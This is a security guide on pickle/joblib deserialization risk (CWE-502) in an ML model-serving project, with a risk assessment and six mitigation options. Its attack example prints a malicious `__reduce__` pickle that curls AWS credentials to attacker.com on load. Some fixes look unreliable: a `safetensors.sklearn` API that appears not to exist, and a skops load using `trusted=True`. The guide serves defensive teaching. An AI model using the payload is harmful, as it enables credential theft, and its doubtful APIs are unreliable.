# Pickle/Joblib Deserialization Security

## The Vulnerability (CWE-502)

### What is Pickle?

Python's `pickle` module serializes Python objects to bytes. `joblib` uses pickle under the hood for ML model
serialization. The problem: **pickle can execute arbitrary code during deserialization**.

### Why is This Dangerous?

When you call `pickle.load()` or `joblib.load()`, Python reconstructs objects by:

1. Reading serialized class definitions
2. **Calling `__reduce__()`, `__setstate__()`, or other magic methods**
3. Executing code embedded in the pickled data

**An attacker can craft a malicious pickle file that executes arbitrary commands.**

---

## Attack Example

```python
# Attacker creates malicious pickle
class Exploit:
    def __reduce__(self):
        return (os.system, ('curl attacker.com?data=$(cat ~/.aws/credentials)',))

pickle.dump(Exploit(), open('malicious.joblib', 'wb'))

# Victim loads → command executes immediately
joblib.load('malicious.joblib')  # ← Credentials stolen!
```

**Attack Vectors:**

- User-uploaded models
- Compromised model registry
- Supply chain attacks
- Man-in-the-middle (MITM)
- Insider threats

---

## Your Current Code Risk Assessment

### Current Implementation (app/model.py:42)

```python
self.model = joblib.load(self.model_path)  # models/iris_classifier.joblib
```

**Risk Profile: LOW** (not zero)
**Why Safe Now:** Locally trained | Hardcoded path | No user input | Learning project
**Becomes HIGH when:** User uploads | URLs | Shared storage | Production deployment

---

## Production-Grade Solutions

### Solution 1: Model Signing & Verification (⭐ Production)

**Training:**

```python
import hmac, hashlib, json
sig = hmac.new(secret_key.encode(), model_bytes, hashlib.sha256).hexdigest()
json.dump({"signature": sig, "algorithm": "HMAC-SHA256"}, open("model_sig.json", "w"))
```

**Loading:**

```python
sig_data = json.load(open("model_sig.json"))
expected = hmac.new(secret_key.encode(), model_bytes, hashlib.sha256).hexdigest()
if not hmac.compare_digest(expected, sig_data["signature"]):
    raise SecurityError("Signature mismatch!")
return joblib.load(model_path)
```

**Pros:** Cryptographically secure ✅ | Detects tampering ✅ | Industry standard ✅
**Cons:** Requires key management (AWS Secrets Manager) ❌ | Extra overhead ❌

---

### Solution 2: Model Registry with Checksums (MLflow)

**Training:**

```python
import mlflow.sklearn
with mlflow.start_run():
    mlflow.sklearn.log_model(model, "iris_classifier")
    mlflow.register_model(f"runs:/{mlflow.active_run().info.run_id}/iris_classifier", "IrisClassifier")
```

**Loading:**

```python
model = mlflow.sklearn.load_model(f"models:/{model_name}/{version}")  # Auto-verifies checksum
```

**Pros:** Built-in checksum ✅ | Version tracking ✅ | Model governance ✅
**Cons:** Requires MLflow infrastructure (Phase 3) ❌ | Complex setup ❌

---

### Solution 3: Safetensors (Modern Alternative)

```bash
pip install safetensors scikit-learn-safetensors
```

```python
from safetensors.sklearn import save_model, load_model

# Training
save_model(model, "iris_classifier.safetensors")

# Loading
model = load_model("iris_classifier.safetensors")
```

**Pros:** Cannot execute code ✅ | Faster than pickle ✅ | Memory-efficient ✅
**Cons:** Relatively new ❌ | Limited ecosystem ❌

---

### Solution 4: ONNX Runtime (Cross-Platform)

```bash
pip install skl2onnx onnxruntime
```

**Training:**

```python
from skl2onnx import convert_sklearn
from skl2onnx.common.data_types import FloatTensorType
onnx_model = convert_sklearn(model, initial_types=[('float_input', FloatTensorType([None, 4]))])
open("iris_classifier.onnx", "wb").write(onnx_model.SerializeToString())
```

**Loading:**

```python
import onnxruntime as rt
sess = rt.InferenceSession("iris_classifier.onnx")
pred = sess.run(None, {sess.get_inputs()[0].name: features})
```

**Pros:** Cannot execute code ✅ | Cross-platform ✅ | Production-grade (MSFT/FB) ✅ | Optimized ✅
**Cons:** Conversion step ❌ | Not all models convert perfectly ❌

---

### Solution 5: skops.io (⭐ Recommended for scikit-learn)

```bash
pip install skops>=0.13.0
```

**Training:** `sio.dump(model, "iris_classifier.skops")`
**Loading:** `model = sio.load("iris_classifier.skops", trusted=True)`

**Pros:** Cannot execute code ✅ | Official sklearn recommendation ✅ | Drop-in replacement ✅ | Python 3.13 compatible ✅
**Cons:** Pre-1.0 (API may change) ⚠️ | No native MLflow support ⚠️

**When to Use:** Immediate CWE-502 fix | scikit-learn models | Minimal code changes | Phase 3 MLflow requires custom wrapper

---

### Solution 6: Restricted Unpickler (Allowlist)

```python
class SafeUnpickler(pickle.Unpickler):
    ALLOWED_CLASSES = {('sklearn.ensemble._forest', 'RandomForestClassifier'), ('numpy', 'ndarray')}

    def find_class(self, module, name):
        if (module, name) not in self.ALLOWED_CLASSES:
            raise pickle.UnpicklingError(f"Disallowed class: {module}.{name}")
        return super().find_class(module, name)

model = SafeUnpickler(open(filepath, 'rb')).load()
```

**Pros:** Works with existing files ✅ | No training changes ✅
**Cons:** Maintain allowlist ⚠️ | Still uses pickle (not foolproof) ⚠️

---

## Comparison Matrix

| Solution | Security | Ease of Use | Infrastructure | Phase |
|----------|----------|-------------|----------------|-------|
| **Model Signing** | ⭐⭐⭐⭐⭐ | ⭐⭐⭐ | Secrets Manager | 2-3 |
| **MLflow Registry** | ⭐⭐⭐⭐ | ⭐⭐⭐⭐ | MLflow server | 3 |
| **Safetensors** | ⭐⭐⭐⭐⭐ | ⭐⭐⭐⭐⭐ | None | Now |
| **ONNX** | ⭐⭐⭐⭐⭐ | ⭐⭐⭐ | None | 2-3 |
| **skops (skops.io)** | ⭐⭐⭐⭐⭐ | ⭐⭐⭐⭐⭐ | None | Now |
| **Restricted Unpickler** | ⭐⭐⭐ | ⭐⭐⭐⭐ | None | Now |

---

## Recommended Implementation Roadmap

### Phase 1 (Now) - Low-Risk Learning

#### Option A: Document

```python
# Security Note: joblib.load() with locally trained model (controlled environment, low risk)
# Production: Migrate to MLflow/ONNX (Phase 3)
self.model = joblib.load(self.model_path)  # nosemgrep: unsafe-pickle-deserialization
```

#### Option B: Hash Verification (Learning Exercise)

```python
# train_model.py
model_hash = hashlib.sha256(open(filepath, 'rb').read()).hexdigest()
metadata["model_hash"] = model_hash

# app/model.py
if hashlib.sha256(open(path, 'rb').read()).hexdigest() != metadata["model_hash"]:
    raise SecurityError("Model hash mismatch!")
```

### Phase 2-3 (Infrastructure)

MLflow Registry + HMAC signing + AWS Secrets Manager + versioning + stage transitions

### Phase 4+ (Production)

**Defense in depth:** MLflow (checksum) | Model signing (HMAC) | Network isolation (VPC) | Audit logging | ONNX

---

## Immediate Actions

- [ ] **Document decision** (5min) - Add security note explaining joblib usage acceptable for learning
- [ ] **Hash verification** (30min) - Implement SHA-256 check as learning exercise
- [ ] **Create issue** (5min) - Track Phase 3 MLflow/ONNX migration
- [ ] **Update CLAUDE.md** (10min) - Document security approach

---

## Further Reading

- [OWASP: Deserialization of Untrusted Data][owasp]
- [Python Pickle Documentation Warning][pickle-docs]
- [MLflow Model Registry Best Practices][mlflow]
- [Safetensors Security Design][safetensors]
- [ONNX Model Zoo][onnx]

## Questions to Consider

1. **Threat model**: Who are potential attackers? (Curious users? Competitors? Nation-states?)
2. **Data sensitivity**: What if model is compromised? (Embarrassing? Revenue loss? Lives at risk?)
3. **Deployment timeline**: When will this hit production? (Determines urgency)
4. **Team skills**: Comfortable managing crypto keys? (Affects solution choice)
5. **Infrastructure**: MLflow/model registry already planned? (Leverage existing plans)

**For learning:** Hash verification (Option B) teaches good habits without over-engineering.
**For production:** MLflow + model signing + ONNX (defense in depth).

[owasp]: https://owasp.org/www-community/vulnerabilities/Deserialization_of_untrusted_data
[pickle-docs]: https://docs.python.org/3/library/pickle.html#module-pickle
[mlflow]: https://mlflow.org/docs/latest/model-registry.html
[safetensors]: https://github.com/huggingface/safetensors#security
[onnx]: https://github.com/onnx/models
